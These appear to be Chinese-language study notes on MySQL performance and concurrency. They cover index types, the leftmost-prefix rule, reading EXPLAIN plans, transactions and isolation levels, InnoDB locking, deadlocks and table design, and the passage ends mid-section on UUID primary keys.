数据太少，MySQL 判断不用索引更快
查询用到了模糊匹配开头，比如 LIKE &#39;%abc&#39;，这种索引就用不上

可以用 EXPLAIN 看看查询计划，判断是不是用了索引。
稀疏索引（Sparse Index）稀疏索引 是一种索引类型，其中并不是对每一行数据都建立索引，而是仅对数据块或数据页中的部分行建立索引。具体来说，它在数据表中的每一页（或某些范围）选择一小部分数据作为索引项，从而减少了存储空间和维护开销。**稀疏索引 **是clickhouse使用的索引，不是MySQL。ClickHouse 不支持传统的索引（如 B-tree 和哈希索引），但通过使用 主键排序 和 稀疏索引，ClickHouse 实现了基于列存储的数据优化。
特点：
节省存储空间：不像传统索引那样对每一行数据都建立索引，因此占用的存储空间较少。
查询效率较低：虽然存储空间小，但查找时需要跳过一部分无关数据，因此查询效率通常比完整索引低。
常用于大数据量的表：适用于大数据量的表，尤其在需要快速定位某些数据范围时，例如大规模的日志文件或时序数据。

举例：假设你有一个大的表，而这个表有 100 万行数据。通过稀疏索引，你可能只会对每 1000 行数据建立一个索引，而不是为每一行数据建立索引。这样，查询时，索引会帮助你找到大致的位置，但仍然需要检查一些数据块中的具体内容。

倒排索引（Inverted Index）倒排索引 常见于全文搜索引擎或文档检索系统。它的基本思想是：给定一个文本字段，倒排索引记录该字段中每个单词（或词条）出现的位置。倒排索引把文档或记录中的词汇与它们出现的具体位置关联起来，从而能在搜索时快速定位相关文档或记录。倒排索引是一种数据结构。
特点：
文本搜索优化：倒排索引特别适用于文本或字符类型字段的搜索（例如搜索引擎中的关键词搜索）。
建立索引时需要分词：每个单词、词条或者关键词都会被拆分成单独的项进行索引。
支持快速全文检索：可以快速查找一个特定单词在哪些文档中出现，并返回这些文档的 ID 或位置。

举例：假设你有一组文档：

“the cat”
“the dog”
“cat and dog”

倒排索引会如下记录：

cat -&gt; [1, 3]
dog -&gt; [2, 3]
the -&gt; [1, 2, 3]
and -&gt; [3]

这样，当你查询 “cat” 时，倒排索引会迅速告诉你，”cat” 出现在文档 1 和文档 3 中。

全文索引（Full-Text Index）全文索引 是一种针对文本数据字段的特殊索引类型，用于加速基于文本内容的查询（如关键字搜索）。它基于倒排索引原理，主要用于支持高效的文本检索。通常，全文索引会对文本内容进行分词处理，将文本拆分成单个的词条，并为每个词条建立索引。
全文索引 和 倒排索引 在概念上是相关的，但它们并不是完全一样的东西。实际上，全文索引 通常是基于 倒排索引 实现的。可以说，**倒排索引 **是实现 全文索引 的一种常见方式。全文索引通常使用倒排索引作为底层数据结构。倒排索引 提供了高效的查找能力，使得全文索引可以快速响应基于单词的查询。**全文索引 **不仅仅是倒排索引，它还包括了对文本的分词、停用词（如 “the”、”a” 等不重要的词）的过滤、词干提取（例如将 “running” 归一化为 “run”）以及复杂查询的支持等。这些操作使得全文索引比简单的倒排索引更加复杂。
特点：
适用于大文本数据：全文索引广泛用于大型文本数据的搜索，如博客、评论、文章、文档等。
支持复杂的文本查询：不仅支持精确匹配，还支持模糊查询、词频查询、近似匹配等复杂搜索方式。
需要额外的存储和处理开销：由于需要对文本进行分词处理、存储词频等信息，全文索引会比传统索引占用更多的存储空间。

举例：例如，假设你对包含文章内容的数据库字段创建了全文索引，查询 dog 时，可以返回所有包含单词 “dog” 的文章，不仅是精确匹配，还可能包括包含类似词的结果，如 “dogs” 或 “dogged”。

覆盖索引 (Covering Index)覆盖索引 是指索引包含了查询所需的所有列的数据。也就是说，在查询过程中，MySQL 可以直接从索引中获取结果，而不需要访问实际的数据表。通过使用覆盖索引，MySQL 可以避免“回表”操作（即去访问数据表），从而提高查询效率。
什么情况下使用覆盖索引

查询的所有列（包括 SELECT 字段、WHERE 子句中的过滤条件、ORDER BY 子句等）都包含在索引中。
这种情况下，查询会直接从索引中获取结果，避免了扫描数据表的过程。


最左前缀原则最左前缀原则（Leftmost Prefix Principle）是关系型数据库中索引的一个重要概念，尤其是在 复合索引（multi-column index）中。它指的是，在使用复合索引时，查询条件必须匹配索引的最左部分，即从复合索引的最左侧开始的列，才能充分利用复合索引。
解释在Mysql的InnoDB引擎中，默认索引用的是B+树，因为 B+ 树是一个从根到叶子是有序搜索路径，如果不从最左边字段开始搜索，就无法走索引路径。
在 MySQL 中，当创建一个复合索引（一个包含多个列的索引）时，这个索引是基于列的顺序来组织的。最左前缀原则要求，查询条件必须按照索引中列的顺序，至少使用索引的最左边的部分，才能有效地利用该复合索引。
规则
最左前缀原则意味着查询中的 WHERE 子句，应该从复合索引的最左边的列开始依次使用。如果某个查询条件没有匹配索引的最左边的列或部分列，MySQL 就不能完全利用这个复合索引。
换句话说，复合索引的使用是按顺序的，查询条件需要依次包含索引中的列。

示例假设你有以下复合索引：
CREATE INDEX idx_name ON employees (last_name, first_name, hire_date);

这个索引是针对 last_name、first_name 和 hire_date 列创建的。根据 最左前缀原则，这个索引可以在以下查询中有效：

完全匹配最左前缀：

SELECT * FROM employees WHERE last_name = &#x27;Smith&#x27; AND first_name = &#x27;John&#x27;;

这个查询首先使用了 last_name，然后使用了 first_name，符合最左前缀原则，可以有效地使用复合索引。

只匹配最左前缀的一部分：

SELECT * FROM employees WHERE last_name = &#x27;Smith&#x27;;

这个查询仅使用了索引的第一个列 last_name，它也可以有效地使用这个复合索引。

匹配最左前缀的一部分但不完全：

SELECT * FROM employees WHERE first_name = &#x27;John&#x27;;

这个查询只使用了索引的第二列 first_name，没有使用索引的第一个列 last_name。根据最左前缀原则，这个查询不能有效使用复合索引。它可以使用其他索引（如果存在的话），但不会使用 idx_name 这个复合索引。

跳过最左前缀的一部分：

SELECT * FROM employees WHERE hire_date = &#x27;2022-01-01&#x27;;

这个查询使用了索引中的第三列 hire_date，但它跳过了前两列 last_name 和 first_name，所以也不能使用复合索引。

LIKE 查询


LIKE &#39;abc%&#39; 可以使用 B+ 树范围查找
LIKE &#39;%abc&#39; 无法使用索引（前缀不确定）
LIKE &#39;a_b%&#39; 仍然能走索引
WHERE name LIKE &#39;abc%&#39; AND age = 30 name 是前缀，但 age 是索引最左字段，没用

Bonus经过测试，MYSQL的优化器会自动调整查询的过滤条件的顺序，以自动匹配最左前缀原则
create index idx_test on ds_vul(source, fixed_time)-- 匹配explain select * from ds_vul where fixed_time &gt; &quot;2020-01-01&quot; and source =&#x27;vim&#x27; -- 也匹配，因为MYSQL优化器会自动调整顺序explain select * from ds_vul where source =&#x27;vim&#x27; and fixed_time &gt; &quot;2020-01-01&quot;-- 不匹配explain select * from ds_vul where fixed_time &gt; &#x27;2020-01-01&#x27;;

为什么最左前缀原则如此重要
复合索引的性能优化：复合索引是为了加速包含多个列的查询，但它的顺序非常重要。如果查询条件没有按照索引列的顺序提供，数据库引擎将无法有效使用该索引。
查询效率：如果查询的列顺序与复合索引的顺序不匹配，数据库必须回退到全表扫描或其他不太高效的查询方式，从而影响查询效率。

如何优化
合理设计索引顺序：根据查询模式来设计索引的列顺序。将最常用的查询列放在复合索引的最左边，以确保查询时能够充分利用索引。
避免不必要的列：如果某些列在查询中使用的频率较低，可以考虑不将它们放在复合索引的最左侧，或者通过单独的索引来优化。
覆盖索引：如果查询仅涉及复合索引中的列，可以利用覆盖索引（covering index），避免回表查询，从而提高查询效率。

SQL 查询优化和执行计划分析SQL 查询的执行顺序你写的是这样：
SELECT name FROM users WHERE age &gt; 18 ORDER BY created_at;

但 MySQL 实际上是按照这个顺序执行的：

FROM（先确定要从哪张表查）
WHERE（先过滤数据）
GROUP BY（如果有分组先分组）
HAVING（对分组后的数据再过滤）
SELECT（确定要查哪些字段）
ORDER BY（最后排序）
LIMIT（控制输出条数）


怎么用 EXPLAIN 看执行计划EXPLAIN 是调试 SQL 性能的关键工具。可以这么用：
EXPLAIN SELECT name FROM users WHERE age &gt; 18;

它会输出一堆字段，几个核心的要会看：

type：连接类型，越靠近 const 越好（顺序大概是：ALL &gt; index &gt; range &gt; ref &gt; eq_ref &gt; const）
possible_keys：MySQL 觉得哪些索引可以用
key：实际用了哪个索引
rows：大概扫描了多少行
Extra：有没有 “Using filesort”、“Using temporary” 这类提示，说明有潜在问题

常见提示的含义
ALL：全表扫描，通常不是好事
Using filesort：用到了额外排序操作，效率较低
Using temporary：中间生成了临时表，占内存或磁盘，注意优化


怎么找出慢查询可以开启 MySQL 的 慢查询日志，用来记录那些执行时间超过某个阈值的 SQL。
设置方式（示例）：
-- 开启慢查询日志SET GLOBAL slow_query_log = 1;-- 设置记录阈值，比如超过 1 秒的记录SET GLOBAL long_query_time = 1;-- 设置记录日志的文件路径（一般默认就有）SHOW VARIABLES LIKE &#x27;slow_query_log_file&#x27;;

然后可以分析这些日志，看看哪些 SQL 是“拖后腿的家伙”。

常用 SQL 优化技巧1. SELECT 需要啥就写啥，别用 SELECT *
SELECT * 会返回所有字段，拖慢速度
表结构一改，程序可能挂
更难走索引覆盖

2. 建合适的索引
经常查的字段加索引，比如 WHERE、JOIN、ORDER BY 里出现的
组合索引按使用顺序排，记住“最左前缀”
不要滥用索引，写操作多的表慎重

3. 使用 LIMIT + 索引分页大分页特别慢，比如：
SELECT * FROM big_table LIMIT 100000, 20;

可以用 延迟分页 优化：
SELECT * FROM big_table WHERE id &gt; 上次最后一条的id LIMIT 20;

这样可以用上索引，避免跳过大量无用数据。
4. 注意函数和隐式转换这些都可能让索引失效：
WHERE DATE(created_at) = &#x27;2024-01-01&#x27;  -- 会失效WHERE created_at &gt;= &#x27;2024-01-01&#x27; AND created_at &lt; &#x27;2024-01-02&#x27;  -- 推荐这样写

类型不一致也会让索引失效：
WHERE id = &#x27;123&#x27;  -- 如果 id 是 INT 类型，这样写可能导致类型转换


常见问题整理为什么明明有索引，SQL 还是很慢
索引字段用错了位置，比如用了函数
查询字段太多，回表成本高
数据量太少，MySQL 判断全表扫描更快
没走覆盖索引（select 的字段不在索引里）

怎么判断是否走了“覆盖索引”EXPLAIN 里 Extra 出现 Using index，说明是走了覆盖索引（不需要回表）
什么是 filesort，为什么要避免MySQL 发现没法用索引排序，就会启用 filesort，可能会写磁盘，效率低。避免它的方法：

对排序字段加索引
避免 ORDER BY 排多个不相关字段
限制返回结果行数（比如加 LIMIT）

EXPLAINEXPLAIN 是 MySQL 用来查看 SQL 执行计划的命令，可以帮助分析 SQL 是否使用了索引，是否存在性能问题。通过它可以提前预判一条 SQL 的执行路径，而不是靠“感觉”去优化。
适用于 SELECT、DELETE、INSERT、REPLACE、UPDATE 等语句（但最常用于 SELECT）。

如何使用 EXPLAIN？用法非常简单，只需要在查询语句前面加上 EXPLAIN 即可：
EXPLAIN SELECT name FROM users WHERE age &gt; 25;

MySQL 会返回一个表格，包含若干列，每列都对应一个执行计划的关键字段。理解这些字段，是掌握 SQL 调优的关键。

EXPLAIN 的输出字段详解id表示查询中每个 SELECT 子句或操作的编号，数字越大表示优先级越高。简单查询通常只有一行，复杂查询（如子查询、联合查询）会出现多行。

id 相同：表示是一个查询块
id 不同：先执行 id 值大的

select_type表示查询的类型，常见的有：

SIMPLE：简单查询，不包含子查询或 UNION
PRIMARY：最外层的查询
SUBQUERY：在 SELECT 或 WHERE 中出现的子查询
DERIVED：出现在 FROM 子句中的子查询（派生表）
UNION：UNION 中的第二个或后续查询
DEPENDENT SUBQUERY：依赖外层查询结果的子查询

table表示当前这一步操作涉及到的表名，可能是具体表名、临时表，或者 derivedN（派生表）。
type以下是 EXPLAIN 中 type 字段的所有取值及其含义，从最差到最好，按性能排序：



type
含义描述
是否使用索引
性能等级
常见场景示例



ALL
全表扫描，逐行检查数据
否
最差
没有索引或查询条件无法使用索引


index
全索引扫描，扫描整个索引
是
较差
覆盖索引但没有过滤条件，如只查询索引字段


range
范围扫描，使用索引的范围条件
是
较好
&lt;, &gt;, BETWEE, LIKE &#39;abc%&#39; 等范围查询


index_merge
使用多个单列索引并合并结果
是
一般
多个字段各自有索引，如 col1 = 1 OR col2 = 2


ref_or_null
类似 ref，但同时处理 IS NULL 情况
是
一般
col = ? OR col IS NULL


ref
非唯一索引等值匹配
是
好
col = ?，其中 col 是普通索引字段


eq_ref
唯一索引等值匹配，一次返回一条记录
是
很好
多表 JOIN 时，通过主键或唯一索引进行连接


const
主键或唯一索引等值查询，最多返回一条
是
最优
WHERE id = 1，id 是主键或唯一索引


system
表只有一行（系统表）
是
最优
极少见，仅用于单行系统表


说明：

ALL 和 index 会全扫描，性能差；
range、ref 是常见且推荐使用的索引访问方式；
eq_ref 和 const 是最优形式，查询效率极高；
const &#x2F; system：一次匹配一行（几乎不耗资源）

推荐至少使用 range 级别，理想状态是 ref 或 eq_ref。
possible_keys表示 MySQL 认为可能使用的索引列表，基于查询条件来判断。
key表示实际使用的索引，如果为 NULL，说明没有用到任何索引。
key_len表示使用的索引长度（单位是字节），可以用来判断索引是否被“用全”。
比如索引是 (name, age)，但 SQL 只用了 name，那 key_len 就只体现了 name 的长度。
ref表示使用哪个字段或常量与索引进行比较。常见值：

const：与常量比较
func：使用函数
NULL：没用上

rowsMySQL 预估本次执行需要扫描的行数。这个值越小越好，是判断是否走索引的直接指标。
需要注意的是，它只是预估值，不一定完全准确。
filtered表示在读取到 rows 行数据后，经过 WHERE 条件过滤后剩下的比例。比如 100 行中 10 行满足条件，那就是 10.0。
这个字段可以结合 rows 看最终参与返回的行数。
Extra这是执行计划中最值得关注的一列，包含一些额外信息，常见的有：

Using index：用了覆盖索引（非常好）
Using where：用了 WHERE 条件过滤
Using filesort：需要额外排序操作（可能影响性能）
Using temporary：使用了临时表（比如 GROUP BY、ORDER BY）
Impossible WHERE：永远不可能成立的条件，比如 WHERE 1=0


判断是否使用了索引优先关注这几列的值：

type：如果是 ALL 或 index，说明没走有效索引
key：是否非 NULL，代表是否实际用上索引
Extra：是否出现 Using filesort 或 Using temporary

一个比较理想的结果是：

type = ref 或更优
key 有值
rows 很少
Extra 里有 Using index 而没有 Using filesort 和 Using temporary


filesortfilesort 是 MySQL 用来处理 排序操作 的一种机制。当查询需要对结果进行排序时（如 ORDER BY 子句），MySQL 会使用 filesort 来完成排序操作。这个名字有点误导，因为它并不总是涉及文件系统排序，实际上它通常是在内存中进行的排序。
何时发生 filesortfilesort 发生在以下情况下：

查询涉及 **ORDER BY** 子句。
在某些情况下，MySQL 无法利用现有的索引来直接进行排序，于是它会将结果临时存储在内存或磁盘中进行排序。

filesort 的性能问题通常是因为排序的数据量较大，无法完全放入内存，导致 MySQL 需要将部分数据写入临时磁盘文件。
举例假设有一个 users 表，查询需要按 age 列排序：
EXPLAIN SELECT * FROM users ORDER BY age;

如果 **age** 列没有索引，或者现有索引不能直接支持排序（比如不包含全部需要的排序列），MySQL 就会使用 filesort 来进行排序。EXPLAIN 输出中会显示 Extra 列为 Using filesort，表示查询使用了 filesort。
filesort 的工作原理
内存排序：如果排序的数据集较小，并且 MySQL 配置允许使用足够的内存（通过 sort_buffer_size 配置项），那么 MySQL 会在内存中完成排序。
磁盘排序：如果排序的数据集太大，无法完全放入内存，MySQL 会将数据写入临时磁盘文件，然后进行排序。这个过程通常比内存排序慢得多。


事务和锁什么是事务事务（Transaction）是一组操作的集合，要么全部执行成功，要么全部失败回滚。它的目标是保证数据的正确性和一致性。
MySQL 默认的 InnoDB 引擎是支持事务的。
事务的四大特性也经常被提起：

原子性（Atomicity）：事务要么全部执行，要么全部不执行
一致性（Consistency）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设约束、触发器、级联回滚等
隔离性（Isolation）：事务之间互不干扰
持久性（Durability）：事务提交后修改会永久保存

如何使用事务可以在 SQL 中手动控制事务：
START TRANSACTION;UPDATE accounts SET balance = balance - 100 WHERE id = 1;UPDATE accounts SET balance = balance + 100 WHERE id = 2;COMMIT;  -- 提交-- 或者ROLLBACK;  -- 回滚

默认情况下，MySQL 是自动提交的。每条语句执行完就自动提交。如果想关闭：
SET autocommit = 0;

执行完再手动提交。
事务提交失败时会回滚到哪里事务中只要没提交（commit），就不会对实际数据生效。发生异常时可以通过 ROLLBACK 撤销未提交的改动。
隔离级别隔离级别的四种类型：

读未提交（Read Uncommitted）
读已提交（Read Committed）
可重复读（Repeatable Read），默认
串行化（Serializable）


读未提交（Read Uncommitted）

定义：事务可以读取另一个未提交事务的数据。换句话说，一个事务可以读取到其他事务正在修改的数据（脏读）。
问题：
脏读（Dirty Read）：一个事务读取到另一个事务尚未提交的数据。假如另一个事务回滚了，这个读取到的数据就不再有效，导致不一致性。


使用场景：通常很少使用，因为它可能会导致数据不一致，但在某些极其宽松的一致性要求下，可能会用到。
示例： 事务 A 修改数据，但尚未提交，事务 B 读取了该数据，随后事务 A 回滚。事务 B 读取的数据是无效的。

读已提交（Read Committed）

定义：一个事务只能读取已经提交的事务的数据。即，事务 A 不会读取事务 B 修改但尚未提交的数据。
问题：
不可重复读（Non-repeatable Read）：事务 A 在同一事务中多次读取相同的记录，事务 B 可能在事务 A 读取两次之间修改了这条记录，导致事务 A 得到不同的值。


使用场景：适用于大多数普通的数据库应用场景，确保了数据不会出现脏读。
示例： 事务 A 读取某行数据，事务 B 修改了这行数据并提交，事务 A 再次读取同一行数据，发现内容已改变。


可重复读（Repeatable Read）

定义：在同一个事务中，多次读取相同的数据结果是相同的。事务 A 在执行期间，事务 B 不能修改事务 A 已读取的数据。MySQL 默认的隔离级别是可重复读。
问题：
幻读（Phantom Read）：事务 A 读取某个范围内的记录，事务 B 插入了新的记录，事务 A 重新读取该范围时，发现结果集发生了变化。在 MySQL 中，**Repeatable Read** 隔离级别默认会使用 “间隙锁（Gap Lock）” 来防止幻读。它会锁住数据行和数据行之间的间隙，防止其他事务在该间隙插入新记录，从而避免幻读的发生。


使用场景：适用于大多数场景，尤其是在需要保证数据一致性的情况下，例如银行转账操作。
示例： 事务 A 读取账户余额，事务 B 插入了新的账户，事务 A 再次读取账户余额时，发现余额发生变化。


串行化（Serializable）

定义：最严格的隔离级别，所有事务按顺序执行，避免了脏读、不可重复读和幻读。事务 A 执行时，其他事务无法访问正在处理的数据。
问题：
性能下降：由于所有事务都需要按顺序执行，数据库的并发性大大降低，吞吐量和响应速度会受到影响。


使用场景：适用于对数据一致性要求极高的场景，通常用于一些非常关键的操作。
示例： 事务 A 和事务 B 都试图同时修改相同的数据行，数据库会强制事务 A 等待事务 B 完成。

设置隔离级别：
SET SESSION TRANSACTION ISOLATION LEVEL REPEATABLE READ;

查看当前隔离级别：
SELECT @@tx_isolation;


MySQL 锁机制概览InnoDB 提供了多种类型的锁机制，用来控制并发：
表锁 vs 行锁
表锁：一锁整个表，简单粗暴，MyISAM 用的是这个
行锁：只锁相关记录，InnoDB 支持，粒度更细，效率高

意向锁（意向共享锁IS &#x2F; 意向排他锁IX）用来表示某行上是否已有锁，是表锁和行锁之间的桥梁，性能更高。
意向锁的两种类型

意向共享锁（IS, Intention Shared）：表示“打算对某些行加共享锁”
意向排他锁（IX, Intention Exclusive）：表示“打算对某些行加排他锁”

举个例子：
SELECT * FROM users WHERE id = 1 LOCK IN SHARE MODE;
这条语句对 id &#x3D; 1 加了共享锁（S锁），同时 InnoDB 会在整张 users 表上加一个 意向共享锁（IS）。
同理：
SELECT * FROM users WHERE id = 1 FOR UPDATE;
这会对该行加排他锁，同时在表上加一个 意向排他锁（IX）。
如果别的事务现在想对整张 users 表加排他锁，InnoDB 可以直接看：

表上是否已经有 IS 或 IX 锁？
如果有，就知道不能加排他锁，直接冲突

不用再去一行一行查了。
所以意向锁是一个“告诉别人我这里有锁”的机制，提高并发时加锁效率。
共享锁（S 锁）允许多个事务同时读取数据，但不能写。
SELECT * FROM users WHERE id = 1 LOCK IN SHARE MODE;

排他锁（X 锁）不允许其他事务读或写。
SELECT * FROM users WHERE id = 1 FOR UPDATE;

在事务中使用 FOR UPDATE 可以防止其他事务修改数据，常用于悲观锁场景。
间隙锁间隙锁（Gap Lock）是 MySQL 中的一种锁类型，它用于锁定某个范围内的数据行之间的空隙，以防止其他事务在该范围内插入新的数据行。间隙锁通常用于防止 幻读（Phantom Read）问题，特别是在 **Repeatable Read** 隔离级别下。
间隙锁的作用：

防止幻读：通过锁定数据行之间的间隙，阻止其他事务在该间隙中插入新的数据行。这样可以确保在同一个事务中多次查询时，查询结果不发生变化，从而避免幻读现象。
锁定范围：与普通的行级锁不同，间隙锁不会锁定具体的数据行，而是锁定两个数据行之间的空隙，防止其他事务插入数据到这个空隙中。

行锁的实现方式InnoDB 采用的是索引上的锁，不是直接锁整行。如果没用索引，行锁就退化成表锁。
因此，使用 WHERE 条件时如果没有走索引，锁粒度会变粗，影响性能。

常见问题与误区行锁一定能锁住某一行吗不一定。如果条件没用索引，InnoDB 会锁整个表范围。
为什么加了 FOR UPDATE 还是被其他事务修改了可能是因为用了非事务引擎，比如 MyISAM，或者语句没有在事务中执行。
死锁定义死锁 是指多个事务在执行过程中，由于资源争用导致事务互相等待对方释放资源，进而形成一种永久等待的状态。这会导致数据库无法继续执行这些事务，造成系统性能下降或停滞。
死锁的发生通常是因为多个事务对数据库的资源（如行、表）进行并发访问，并且它们之间存在循环等待的关系。
死锁的四个必要条件死锁发生的四个必要条件是：

互斥条件（Mutual Exclusion）：至少有一个资源是被一个事务独占的，其他事务不能访问该资源，直到当前事务释放资源。
占有并等待条件（Hold and Wait）：一个事务持有至少一个资源，并等待获得其他事务持有的资源。
不剥夺条件（No Preemption）：事务持有的资源不能被强制剥夺，必须等事务完成并释放资源后，其他事务才能获取这些资源。
循环等待条件（Circular Wait）：多个事务形成一个环状依赖链，每个事务都在等待下一个事务释放它所需要的资源。

当这四个条件同时满足时，就会发生死锁。
死锁的例子假设有两个事务 A 和 B，它们分别执行以下操作：

事务 A：获取资源 R1，等待资源 R2。
事务 B：获取资源 R2，等待资源 R1。

此时：

事务 A 持有 R1，并等待获取 R2。
事务 B 持有 R2，并等待获取 R1。

由于事务 A 和事务 B 互相等待对方释放资源，它们进入了一个死锁状态，无法继续执行。
死锁检测和解决死锁检测大多数数据库管理系统（DBMS）可以自动检测死锁。在检测到死锁时，数据库系统会选择回滚其中一个事务以解除死锁。

死锁检测算法：数据库系统通常会构建一个等待图，如果图中出现环形依赖，说明发生了死锁。

死锁解决当死锁发生时，数据库需要解决死锁问题，通常的做法是回滚其中一个事务。

回滚事务：数据库系统会回滚其中一个事务，释放它所占用的资源，从而打破死锁，允许其他事务继续执行。
超时机制：在一些系统中，事务如果等待锁的时间过长，可以自动回滚，以避免死锁的发生。

死锁预防通过设计良好的数据库操作流程，可以尽量避免死锁的发生。例如：

按固定顺序获取锁：确保所有事务按相同的顺序请求资源，避免形成环状依赖。
减少锁的粒度：锁定尽可能小的数据范围，减少死锁的可能性。
避免长时间持有锁：事务持有锁的时间越长，死锁的机会就越大。

总结
死锁 是多事务并发执行时，由于互相等待而无法继续执行的状态。
死锁的发生需要满足四个条件：互斥、占有并等待、不剥夺、循环等待。
解决死锁的方式通常是回滚其中一个事务，释放资源，打破死锁。
预防死锁 可以通过合理设计事务的锁获取顺序、减少锁的粒度、避免长时间持有锁等方法来实现。

乐观锁和悲观锁乐观锁和悲观锁不是 MySQL 内置的“锁类型”，它们是一种并发控制策略，而不是数据库层直接定义的“锁”。
可以理解为：乐观锁和悲观锁，是怎么用这些数据库锁的“思路”或“方式”。

悲观锁悲观锁假设“别人随时可能来改数据”，所以自己在读或写之前，先把数据锁住，防止别人动。
在 MySQL 里怎么实现悲观锁？InnoDB 的 SELECT ... FOR UPDATE 或 LOCK IN SHARE MODE 就是典型的悲观锁实现方式。比如：
START TRANSACTION;SELECT stock FROM products WHERE id = 1 FOR UPDATE;UPDATE products SET stock = stock - 1 WHERE id = 1;COMMIT;

在这个过程中，如果其他事务也想对 id&#x3D;1 进行 FOR UPDATE，就会被阻塞，直到当前事务提交或回滚。也就是说，真的会加锁，真的会阻塞别人。
这就是 “悲观锁”：怕别人来抢，先锁再说。

乐观锁乐观锁的思路是：我先不锁，我假设别人不会来改，如果真有人改了，那我再处理冲突。
在 MySQL 里怎么实现乐观锁？最常见的方法就是用 版本号（version 字段） 或 时间戳（last_updated） 控制。
例子：

读出一条数据：当前 version 是 3
处理业务逻辑
更新时带上版本号：

UPDATE products SET stock = stock - 1, version = version + 1 WHERE id = 1 AND version = 3;

如果返回行数是 1，说明没人改成功了；如果是 0，说明有人改了 version，现在不是 3 了，那这次就失败，需要重试。
这就是乐观锁：不阻塞，但靠检测是否被改过来避免冲突。

那跟 InnoDB 的行锁、表锁、意向锁有什么关系？可以这样归纳：



名称
属于数据库机制
是否真的加锁
是否阻塞
常见语法



行锁
✅ 是
✅ 是
✅ 是
FOR UPDATE 等


表锁
✅ 是
✅ 是
✅ 是
LOCK TABLE


意向锁
✅ 是
✅ 是
✅ 是
自动管理，不手动写


悲观锁
❌ 是策略
✅ 借助锁
✅ 是
FOR UPDATE


乐观锁
❌ 是策略
❌ 不加锁
❌ 不阻塞
WHERE version&#x3D;x


所以：

行锁、表锁这些是底层原生机制
乐观锁、悲观锁是业务设计思路，靠具体写法实现


哪种更适合大并发
乐观锁：适合 读多写少 的业务，比如用户资料修改、库存秒杀（配合重试机制）
悲观锁：适合 写冲突多、修改必须原子性强 的业务，比如银行转账


表设计规范和性能调优技巧字段类型的选择字段类型选得好，数据存得快、查得快，还省空间。常见建议如下：

能用 TINYINT、SMALLINT 就别直接用 INT、BIGINT
字段长度不要随便给个超大值，比如 VARCHAR(255) 不等于安全
精确度要求不高的金额，用整数存，比如“以分为单位”
时间字段优先使用 DATETIME，避免 TIMESTAMP 的时区问题
不用 ENUM，扩展性差，换成 TINYINT + 映射表可维护性更好

TEXT 和 VARCHAR 有啥区别
VARCHAR 是变长字符串，最多 65535 字节（和行大小有关）
TEXT 是独立存储的，不适合频繁查询或排序
TEXT 字段不能加普通索引（要用前缀索引或全文索引）

建议普通文本就用 VARCHAR，超过几千字符才考虑 TEXT

范式范式的目标是去重、避免冗余。常用的是三范式：

第一范式（1NF）：字段不可再分
第二范式（2NF）：每列完全依赖主键（不依赖部分）
第三范式（3NF）：不依赖于其他非主属性

简单说，设计上尽量拆表，避免“一个表塞所有东西”的情况。

范式为什么在项目里经常不管用范式理论虽然漂亮，但在真实项目中，有时候为了查询效率，会选择反范式设计：

把本来该拆成两张表的数据合成一张（避免 JOIN）
保留一些重复字段，换取查询速度

比如电商订单表，可能会冗余存一下用户昵称、商品快照信息，就是典型的反范式实践。

拆表怎么搞，什么时候该拆表数据一多，几百万几千万的时候，一些常规操作就开始卡顿，这时候就该考虑拆表。
垂直拆表按功能或字段类别拆，比如：

经常查询的字段放一张表（热点字段）
不常用的大字段（比如用户简介、头像）单独放表

水平拆表按数据量来拆，比如：

用户表超过千万记录，可以按用户 ID 哈希分成 128 张表
或者按时间分表：orders_2024_q1、orders_2024_q2 这种

可以用中间层封装拆分逻辑，比如引入 MyCAT、ShardingSphere 等分库分表中间件。

大表优化技巧限制宽表设计
字段太多会影响查询效率、缓存命中率
大字段放外表，非热字段也可以拆

控制单表数据量
理论上 InnoDB 支持 64TB，但实际磁盘、索引、查询压力都跟不上
单表 500 万 ~ 1000 万记录开始出现性能问题是很常见的事

读写分离
通过主从同步架构，将读操作分发到从库
减少主库压力，提高并发能力

合理分区表（不是分表）MySQL 还支持 分区表，但限制多、运维复杂，适合特定场景（如按月分区查询）。

常见问题整理一张表字段太多或数据太多，哪个更危险？都危险。字段太多会变成宽表，影响缓存、索引命中；数据太多会导致查询变慢、写入卡顿。两者都要控制在合理范围。
VARCHAR 要不要给得很长，比如 VARCHAR(1000)如果实际数据都很短，字段越长越浪费内存，尤其是用内存临时表的时候。建议根据实际情况定长。
为什么有时候拆表反而让查询更慢了拆表会带来更多 JOIN、代码复杂度变高，如果不是瓶颈，盲目拆表是优化过度。一定要基于数据量、业务特征来判断。

存储引擎和日志MySQL 支持多种存储引擎，理解成“不同的底层实现方式”，每种引擎对数据的读写方式、锁机制、事务支持等都不一样。
查看当前默认存储引擎：
SHOW VARIABLES LIKE &#x27;default_storage_engine&#x27;;

查看某张表用的存储引擎：
SHOW TABLE STATUS LIKE &#x27;表名&#x27;;


InnoDB 和 MyISAM 的主要区别


特性
InnoDB
MyISAM



事务
支持
不支持


行级锁
支持
不支持（表锁）


外键
支持
不支持


崩溃恢复能力
强（有日志）
弱（容易损坏）


查询性能
高并发时表现更好
适合只读或低并发


主键方式
聚簇索引
普通索引


数据存储
数据和索引合存
分开存储


结论是：99% 的场景推荐用 InnoDB，MyISAM 基本上已是历史遗产。

聚簇索引的概念InnoDB 使用 聚簇索引（Clustered Index），主键索引就是数据本身，其他辅助索引存的是主键。
优点：

主键查询特别快
范围查询效率也高

缺点：

主键太长会导致其他索引体积变大
更新主键代价高（要移动整行数据）

因此，设计表时建议使用整型自增主键作为主键，简洁又高效。

日志系统InnoDB 之所以强悍，很大程度上依赖它的日志机制：
重做日志（Redo Log）
用来实现 崩溃恢复
即使 MySQL 宕机，只要事务提交了，数据就能恢复

回滚日志（Undo Log）
实现 事务回滚 和 MVCC
查询操作可以看到历史版本，支撑事务的隔离性

二进制日志（Binlog）
属于 MySQL 层日志，不依赖存储引擎
用于主从同步和数据恢复

这套日志组合，让 InnoDB 实现了 先写日志再改数据 的写流程，保证了事务的安全性。

InnoDB 的参数调优建议（初级）调整 Buffer PoolBuffer Pool 是 InnoDB 用来缓存数据和索引的内存区域，尽量给大一些，提升读写效率。
SHOW VARIABLES LIKE &#x27;innodb_buffer_pool_size&#x27;;

建议设为服务器内存的 60%-70%（如果是专用 MySQL 服务器）。
调整事务提交模式innodb_flush_log_at_trx_commit = 1

这是默认设置，事务每次提交都要落盘，最安全但写入慢。
可选：

0：每秒写一次日志，不保证完全不丢数据
2：写日志但不立刻刷盘，性能高一些，有小概率丢事务

根据数据安全级别需求调整。

常见问题与解释为什么主键不能随便用 UUID？
